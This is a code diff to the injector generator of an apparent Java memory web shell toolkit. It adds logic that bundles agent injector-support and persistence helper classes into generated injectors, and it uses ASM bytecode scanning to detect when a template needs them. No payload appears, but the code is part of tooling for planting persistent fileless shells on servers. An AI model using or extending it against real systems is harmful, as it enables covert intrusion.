@@ -1,7 +1,9 @@
 package com.reajason.javaweb.memshell.generator;
 
 import com.reajason.javaweb.ClassBytesShrink;
+import com.reajason.javaweb.agent.AgentInjectorSupport;
 import com.reajason.javaweb.agent.AgentPersistence;
+import com.reajason.javaweb.asm.ClassReferenceVisitor;
 import com.reajason.javaweb.asm.InnerClassDiscovery;
 import com.reajason.javaweb.buddy.*;
 import com.reajason.javaweb.memshell.ShellType;
@@ -16,18 +18,20 @@ import net.bytebuddy.dynamic.DynamicType;
 import net.bytebuddy.dynamic.scaffold.TypeValidation;
 import net.bytebuddy.implementation.FixedValue;
 import net.bytebuddy.pool.TypePool;
+import org.objectweb.asm.ClassReader;
 
 import java.util.*;
 
 import static net.bytebuddy.matcher.ElementMatchers.named;
-
-
 
 /**
  * @author ReaJason
  * @since 2024/11/24
  */
 public class InjectorGenerator {
+    private static final String INJECTOR_SUPPORT_INTERNAL_NAME =
+            AgentInjectorSupport.class.getName().replace('.', '/');
+
     private final ShellConfig shellConfig;
     private final InjectorConfig injectorConfig;
 
@@ -83,9 +87,6 @@ public class InjectorGenerator {
         String originalClassName = injectorConfig.getInjectorTemplateClassName();
         ClassLoader templateClassLoader = templateClassLoader();
         Set<String> innerClassNames = InnerClassDiscovery.findAllInnerClasses(originalClassName, templateClassLoader);
-        if (innerClassNames.isEmpty()) {
-            return Collections.emptyMap();
-        }
 
         String newClassName = injectorConfig.getInjectorClassName();
 
@@ -109,19 +110,30 @@ public class InjectorGenerator {
             }
         }
         TypeDescription templateType = typePool.describe(originalClassName).resolve();
-        if (!templateType.getDeclaredMethods().filter(named("persist")).isEmpty()) {
-            addPersistenceClasses(classFileLocator, typePool, bytes);
+        boolean persistent = !templateType.getDeclaredMethods().filter(named("persist")).isEmpty();
+        if (persistent) {
+            addCompanionClasses(classFileLocator, typePool, bytes, companionClasses(AgentPersistence.class));
+        }
+        // AgentPersistence 依赖 AgentInjectorSupport，声明 persist 的模板一并打包，避免伴随类缺半边。
+        if (persistent || referencesInjectorSupport(classFileLocator, originalClassName)) {
+            addCompanionClasses(classFileLocator, typePool, bytes, companionClasses(AgentInjectorSupport.class));
         }
         return bytes;
     }
 
     @SneakyThrows
-    private void addPersistenceClasses(ClassFileLocator classFileLocator, TypePool typePool, Map<String, byte[]> bytes) {
-        Set<String> persistenceClasses = new LinkedHashSet<>();
-        persistenceClasses.add(AgentPersistence.class.getName());
-        persistenceClasses.addAll(InnerClassDiscovery.findAllInnerClasses(AgentPersistence.class));
-        for (String persistenceClass : persistenceClasses) {
-            TypeDescription type = typePool.describe(persistenceClass).resolve();
+    private static Set<String> companionClasses(Class<?> companion) {
+        Set<String> companions = new LinkedHashSet<String>();
+        companions.add(companion.getName());
+        companions.addAll(InnerClassDiscovery.findAllInnerClasses(companion));
+        return companions;
+    }
+
+    @SneakyThrows
+    private void addCompanionClasses(ClassFileLocator classFileLocator, TypePool typePool,
+                                     Map<String, byte[]> bytes, Set<String> companionClasses) {
+        for (String companionClass : companionClasses) {
+            TypeDescription type = typePool.describe(companionClass).resolve();
             DynamicType.Builder<?> builder = new ByteBuddy()
                     .with(TypeValidation.DISABLED)
                     .redefine(type, classFileLocator)
@@ -132,6 +144,23 @@ public class InjectorGenerator {
                 }
             }
         }
+    }
+
+    @SneakyThrows
+    private static boolean referencesInjectorSupport(ClassFileLocator classFileLocator, String templateClassName) {
+        ClassFileLocator.Resolution resolution = classFileLocator.locate(templateClassName);
+        if (!resolution.isResolved()) {
+            return false;
+        }
+        ClassReferenceVisitor visitor = new ClassReferenceVisitor();
+        new ClassReader(resolution.resolve()).accept(visitor, ClassReader.SKIP_DEBUG | ClassReader.SKIP_FRAMES);
+        for (String reference : visitor.getReferencedClasses()) {
+            if (reference.equals(INJECTOR_SUPPORT_INTERNAL_NAME)
+                    || reference.startsWith(INJECTOR_SUPPORT_INTERNAL_NAME + "$")) {
+                return true;
+            }
+        }
+        return false;
     }
 
     @SneakyThrows
